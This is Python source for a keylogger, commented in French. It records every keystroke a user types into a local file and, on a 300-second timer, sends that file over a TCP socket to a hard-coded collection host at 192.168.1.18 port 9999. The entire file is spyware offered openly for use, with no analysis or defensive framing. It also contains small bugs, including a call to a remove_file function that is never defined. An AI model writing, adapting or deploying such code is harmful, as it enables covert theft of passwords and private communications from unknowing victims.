from pynput import keyboard
from threading import Timer
import socket

ip = "192.168.1.18"
list = []

def get_key_name(key):
    if isinstance(key,keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    key_name = get_key_name(key)
    list.append(key_name)
    f = open('keyPressed.txt','w')
    for ele in list:
          f.write(ele)
    f.close()
#    print("Key {} pressed".format(key_name))
#    print("Key type: {}".format(key.__class__.__name__))


def timer():
	time = Timer(300, timer)  # après chaque 10s on lance la function timer
	time.start()
	try:
		file = open("keyPressed.txt", "r")
		sendFile()
		file.close
		file = open("keyPressed.txt", "w")
		file.close
	except:
		nothing = ""

def sendFile():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, 9999))
	with open('keyPressed.txt', 'rb') as file:
		s.send("Get checker file".encode('ascii'))
		l = file.read(1024)
		while (l):
			s.send(l)
			l = file.read(1024)

	remove_file()

	print("Le fichier a été correctement copié et effacer ")


if __name__ == "__main__":
    with keyboard.Listener(
        on_press = on_press) as listener:
        timer() 
        listener.join()
